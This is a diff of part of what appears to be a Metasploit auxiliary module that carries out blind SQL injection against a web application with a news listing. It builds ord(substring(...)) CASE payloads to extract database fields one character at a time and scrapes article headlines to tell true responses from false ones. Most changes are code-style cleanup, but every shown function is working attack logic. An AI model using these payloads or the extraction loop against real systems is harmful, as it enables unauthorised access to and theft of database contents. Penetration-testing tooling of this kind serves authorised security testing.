@@ -96,30 +96,30 @@ class MetasploitModule < Msf::Auxiliary
                       size,
                       charset,
                       patterns)
-    return data
+    data
   end
 
   def select_position(field, table, condition, position, char)
     payload1 = "select(#{field})from(#{table})where(#{condition})"
     payload2 = "ord(substring((#{payload1})from(#{position})for(1)))"
     payload3 = "uid*(case((#{payload2})=#{char.ord})when(1)then(1)else(-1)end)"
-    return payload3
+    payload3
   end
 
   def blind_size(field, table, condition, size, charset,  patterns = {})
+    vprint_status("Retrieving field '#{field}' string (#{size} bytes)...")
+
     str = ""
     for position in 0..size
       for char in charset.split('')
         payload = select_position(field, table, condition, position + 1, char)
-        #print_status(payload)
         if test(payload, patterns)
           str += char.to_s
-          #print_status(str)
           break
         end
       end
     end
-    return str
+    str
   end
 
   def test(payload, patterns = {})
@@ -141,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
     return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
   end
 
-  def try_autodetect_patterns()
+  def try_autodetect_patterns
     print_status("Trying to automatically determine Pattern1 and Pattern2...")
     res = send_request_cgi({
       'method'   => 'POST',
@@ -151,19 +151,18 @@ class MetasploitModule < Msf::Auxiliary
         'no_cache' => '1'
        }
     })
-    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]');
+    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]')
     pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
     pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
-    if pattern1 != '' and pattern2 != ''
-      print_status("Pattern1: #{pattern1}")
-      print_status("Pattern2: #{pattern2}")
-    else
+
+    if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')
       print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user speficied values...")
       pattern1 = datastore['PATTERN1']
       pattern2 = datastore['PATTERN2']
-      print_status("Pattern1: #{pattern1}")
-      print_status("Pattern2: #{pattern2}")
     end
+
+    print_status("Pattern1: #{pattern1}")
+    print_status("Pattern2: #{pattern2}")
     return pattern1, pattern2
   end
 
